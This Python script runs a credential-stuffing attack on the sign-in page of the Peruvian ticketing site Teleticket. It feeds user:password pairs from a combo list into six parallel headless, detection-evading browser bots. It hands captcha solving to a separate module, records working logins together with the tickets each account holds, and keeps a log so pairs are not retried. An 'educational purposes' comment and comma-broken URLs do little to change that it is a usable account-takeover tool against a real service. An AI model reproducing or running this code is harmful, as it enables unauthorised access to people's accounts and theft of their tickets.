#I made this for educational purposes
#I put "," in the URLs
#PERMITE HACERLE FUERZA BRUTA CON USUARIOS,PASSWORD A TELETICKET

def main():
    os.system('cls')
    # credenciales = input('Ingresa el nombre de tu txt: ')
    credenciales = 'combotele.txt'
    # num_bots = int(input("Por favor, introduce el número de bots: "))
    num_bots = 6

    if not credenciales.endswith('.txt'):
        credenciales += '.txt'
    with open(credenciales, 'r', encoding='utf-8') as txt:
        logins = [linea.strip().split(':') for linea in txt]
    processed_logins = get_processed_logins()
    logins = filter_logins(logins, processed_logins)
    print(f"{Fore.GREEN}[INFO] --> Se encontraron {len(logins)} logins.")

    with ThreadPoolExecutor(max_workers=num_bots) as executor:
        executor.map(handle, logins)


import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import WebDriverWait
from concurrent.futures import ThreadPoolExecutor
import time
from selenium.common.exceptions import NoSuchElementException, TimeoutException
from selenium import webdriver
from colorama import Fore
from selenium.webdriver.edge.service import Service
import os
from seleniumbase import Driver
import Pruebas02
import random


def navega():
    # options = uc.ChromeOptions()
    # options.add_experimental_option("prefs", {"credentials_enable_service": False})
    driver = Driver(headless=True)
    driver.set_window_size(400, 915)
    driver.get('https://t,e,l,et,icket.com.pe/Account/SignIn')
    driver.get('https://tel,et,ic,ket.com.pe/Account/SignIn')
    driver.set_window_size(400, 915)

    return driver


def elemento_presente(driver, selector, *textos):
    try:
        elementos = driver.find_elements(By.CSS_SELECTOR, selector)
        for elemento in elementos:
            if any(texto in elemento.text for texto in textos):
                return True
        return False
    except NoSuchElementException:
        return False


def check_login(driver):
    time.sleep(3)
    start_time = time.time()
    timeout = 5

    while time.time() - start_time < timeout:
        try:
            current_url = driver.current_url
            if current_url == "https://te,le,tick,et.com.pe/Account/SignIn":
                return False
            else:
                driver.get('https://te,leti,ck,et.com.pe/Cliente/MisETickets')
                return True
        except TimeoutException:
            pass

        time.sleep(0.2)

    return False


def get_processed_logins():
    try:
        with open('processed_logins.txt', 'r') as f:
            return set(line.strip() for line in f)
    except FileNotFoundError:
        return set()


def filter_logins(logins, processed_logins):
    filtered_logins = []
    for login in logins:
        if len(login) == 2 and f"{login[0]}:{login[1]}" not in processed_logins:
            filtered_logins.append(login)

    return filtered_logins


def write_to_file(filename, text):
    with open(filename, 'a') as f:
        f.write(text)


def captura(driver):
    try:
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.CSS_SELECTOR,
                                                '#body-content > div:nth-child(2) > div > div > div > div')))
        data = driver.find_element(By.CSS_SELECTOR, '#body-content > div:nth-child(2) > div > div > div > div')
        texto = data.find_element(By.TAG_NAME, 'h3').text
        return texto

    except:
        return '<-------------------  Tiene tickets'




def enviar_login(driver, usuario, password, ruta):
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, 'username-ext')))
    WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.NAME, 'username-ext')))
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'username-ext'))).send_keys(usuario)
    WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, 'password-ext'))).send_keys(password)
    time.sleep(1)
    try:
        Pruebas02.capcha(driver, ruta)
    except:
        driver.switch_to.default_content()
    WebDriverWait(driver, 15).until(EC.element_to_be_clickable((By.CSS_SELECTOR, '.seleccionar'))).click()
    WebDriverWait(driver, 15).until(EC.element_to_be_clickable((By.CSS_SELECTOR, '.cookie-disclaimer__btn'))).click()



def procces_login(driver, usuario, password, ruta):
    enviar_login(driver, usuario, password, ruta)
    login_status = check_login(driver)
    return login_status



def handle(logins):
    usuario, password = logins
    driver = navega()

    cadena = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
    ruta = ''.join(random.choice(cadena) for _ in range(int((len(cadena)+2)/4)))+'.mp3'


    try:
        status = procces_login(driver, usuario, password, ruta)
        if status:
            data = captura(driver)
            print(f'{Fore.GREEN}[!] CREDENCIALES CORRECTAS!: {Fore.BLUE}usuario: {usuario}: {password} | Tiene: "{data}"')
            write_to_file('correct_logins.txt', f"{usuario}:{password} {data}\n")
        else:
            print(f'{Fore.RED}[!] CREDENCIALES INCORRECTAS: {usuario} | password: {password}')
    finally:
        driver.quit()
        write_to_file('processed_logins.txt', f"{usuario}:{password}\n")



if __name__ == "__main__":

    main()



